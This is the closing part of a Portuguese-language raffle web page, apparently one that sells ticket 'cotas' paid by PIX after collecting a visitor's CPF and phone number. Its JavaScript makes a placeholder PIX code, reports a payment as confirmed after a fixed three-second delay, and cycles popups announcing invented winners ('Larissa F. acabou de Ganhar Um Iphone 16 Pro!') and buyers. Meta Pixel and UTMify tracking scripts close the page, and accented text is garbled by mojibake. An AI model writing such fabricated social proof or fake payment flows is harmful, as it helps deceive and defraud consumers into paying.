            const qrCodeImage = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=pix_exemplo_${Date.now()}`;
            
            document.getElementById('qrCodeImage').innerHTML = 
                `<img src="${qrCodeImage}" alt="QR Code PIX" style="max-width: 200px; border: 1px solid #ddd;">`;
            
            document.getElementById('codigoPIX').value = `pix_exemplo_${Date.now()}_codigo_aleatorio`;
            
            document.getElementById('areaPIX').style.display = 'block';
            btnGerarPIX.style.display = 'none';
            document.getElementById('aguardandoConfirmacao').style.display = 'block';
            
            // Gerar transaction ID
            dadosUsuario.transactionId = 'trans_' + Date.now();
            
            // Simular confirma√ß√£o autom√°tica ap√≥s 3 segundos
            setTimeout(() => {
                processarConfirmacao({
                    confirmado: true,
                    status: 'paid',
                    amount: pacoteSelecionado.valor
                });
            }, 3000);
            
        } catch (error) {
            console.error('‚ùå Erro:', error);
            
            erroTelefone.textContent = `Erro: ${error.message}. Tente novamente.`;
            erroTelefone.style.display = 'block';
            
            btnGerarPIX.innerHTML = 'Gerar PIX para pagamento';
            btnGerarPIX.disabled = false;
        }
    }

    function copiarCodigoPIX() {
        const codigoInput = document.getElementById('codigoPIX');
        const btnCopiar = document.querySelector('.input-copiar button');
        
        if (!codigoInput.value) return;
        
        const textoOriginal = btnCopiar.textContent;
        
        codigoInput.select();
        codigoInput.setSelectionRange(0, 99999);
        
        navigator.clipboard.writeText(codigoInput.value)
            .then(() => {
                btnCopiar.textContent = '‚úÖ Copiado!';
                btnCopiar.style.background = '#28a745';
                
                mostrarPopupNotificacao('‚úÖ C√≥digo PIX copiado!');
                
                setTimeout(() => {
                    btnCopiar.textContent = textoOriginal;
                    btnCopiar.style.background = '#2f4eb5';
                }, 3000);
            })
            .catch(err => {
                document.execCommand('copy');
                btnCopiar.textContent = '‚ùå Falhou';
                btnCopiar.style.background = '#e74c3c';
                
                setTimeout(() => {
                    btnCopiar.textContent = textoOriginal;
                    btnCopiar.style.background = '#2f4eb5';
                }, 3000);
            });
    }

    function processarConfirmacao(dadosConfirmacao) {
        document.getElementById('statusAguardando').innerHTML = '<span style="color: #28a745;">‚úÖ Pagamento confirmado! Redirecionando...</span>';
        
        document.getElementById('transacaoId').textContent = dadosUsuario.transactionId;
        
        mostrarPopupNotificacao('‚úÖ Pagamento confirmado!');
        
        setTimeout(() => {
            mostrarEtapa(3);
        }, 2000);
    }

    // ETAPA 3: CONFIRMA√á√ÉO PARA PR√äMIO
    function avancarParaEtapa4() {
        mostrarEtapa(4);
    }

    // FUN√á√ïES AUXILIARES
    function mostrarPopupNotificacao(mensagem, isError = false) {
        const popup = document.getElementById('popup');
        popup.textContent = mensagem;
        popup.style.background = isError ? '#e74c3c' : '#28a745';
        popup.style.display = 'block';
        
        if (document.getElementById('notifySound')) {
            document.getElementById('notifySound').play().catch(e => console.log('Som n√£o dispon√≠vel'));
        }
        
        setTimeout(() => {
            popup.style.display = 'none';
        }, 4000);
    }

    // INICIALIZA√á√ÉO
    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('numero').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            let valor = parseInt(this.value) || 0;
            if (valor > 500) this.value = 500;
            atualizarBotaoComprar();
        });
        
        document.getElementById('modalPagamento').addEventListener('click', function(e) {
            if (e.target === this) {
                fecharModal();
            }
        });
        
        document.getElementById('inputCPF').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const btn = document.getElementById('btnContinuarCPF');
                if (!btn.disabled) {
                    validarCPFeAvancar();
                }
            }
        });
        
        document.getElementById('inputTelefone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                gerarPIX();
            }
        });
        
        iniciarPopups();
    });

    // POPUPS DE NOTIFICA√á√ÉO
    function iniciarPopups() {
        const mensagens = [
            "Jo√£o P. acabou de Ganhar 50mil!",
            "Larissa F. acabou de Ganhar Um Iphone 16 Pro!",
            "Diego S. acabou de comprar 70 cotas!",
            "Juliana M. acabou de comprar 100 cotas!",
            "Bruno T. acabou de comprar 200 cotas!",
            "Carla R. acabou de comprar 70 cotas!",
            "Felipe N. acabou de comprar 30 cotas!",
            "Amanda C. acabou de comprar 40 cotas!",
            "Pedro V. acabou de comprar 70 cotas!",
            "Thais L. acabou de comprar 100 cotas!",
        ];

        let index = 0;

        function mostrarPopup() {
            if (index >= mensagens.length) return;

            const popup = document.getElementById('popup');
            popup.innerText = mensagens[index];
            popup.style.display = 'block';
            
            if (document.getElementById('notifySound')) {
                document.getElementById('notifySound').play().catch(e => console.log('Som n√£o dispon√≠vel'));
            }

            setTimeout(() => {
                popup.style.display = 'none';
                index++;
                setTimeout(mostrarPopup, 5000);
            }, 4000);
        }

        setTimeout(mostrarPopup, 1000);
    }
    </script>

    <!-- Meta Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '1566849421225167');
    fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=1566849421225167&ev=PageView&noscript=1"
    /></noscript>
    <!-- End Meta Pixel Code -->
    <!-- UTMify Script -->
    <script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-xcod-sck
        data-utmify-prevent-subids
        async
        defer
    ></script>
    
    <script>
  window.pixelId = "6953b03a04688180602e47b9";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</body>
</html>